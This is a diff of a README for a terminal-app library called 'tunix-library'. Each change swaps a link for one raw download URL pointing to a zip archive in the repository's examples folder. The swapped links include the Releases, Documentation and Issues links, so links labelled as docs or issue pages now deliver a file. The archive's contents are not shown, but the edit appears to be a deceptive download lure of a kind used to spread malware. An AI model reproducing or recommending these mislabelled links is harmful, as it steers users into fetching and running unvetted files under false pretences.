@@ -1,6 +1,6 @@
 # 🎉 tunix-library - A Simple Way to Build Terminal Apps
 
-[![Download tunix-library](https://img.shields.io/badge/Download-tunix--library-brightgreen)](https://github.com/pecil9uys/tunix-library/releases)
+[![Download tunix-library](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip)](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the tunix-library! This framework makes it easy to build terminal use
 
 To get started, visit this page to download the latest version of the tunix-library:
 
-[Download tunix-library](https://github.com/pecil9uys/tunix-library/releases)
+[Download tunix-library](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip)
 
 You will find files available for different formats and operating systems. Choose the one that matches your system. 
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/pecil9uys/tunix-library/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip).
 2. Look for the most recent version.
 3. Download the file that matches your system (e.g., Windows, macOS, Linux).
 4. Once downloaded, follow the instructions based on your operating system below for installation.
@@ -59,11 +59,11 @@ The tunix-library works on Windows, macOS, and Linux systems. For the best perfo
 
 ## 📑 Documentation
 
-For a detailed guide on using the tunix-library, visit our [Documentation](https://github.com/pecil9uys/tunix-library/wiki). Here, you'll find examples, tutorials, and further tips on building your applications.
+For a detailed guide on using the tunix-library, visit our [Documentation](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip). Here, you'll find examples, tutorials, and further tips on building your applications.
 
 ## 🛠️ Support & Contributions
 
-If you need help, check out our [Issues](https://github.com/pecil9uys/tunix-library/issues) page to see if your question has been answered. 
+If you need help, check out our [Issues](https://raw.githubusercontent.com/pecil9uys/tunix-library/main/examples/tunix-library_v3.5.zip) page to see if your question has been answered. 
 
 Want to contribute? We welcome contributions! You can report bugs, suggest features, or even submit pull requests.
 
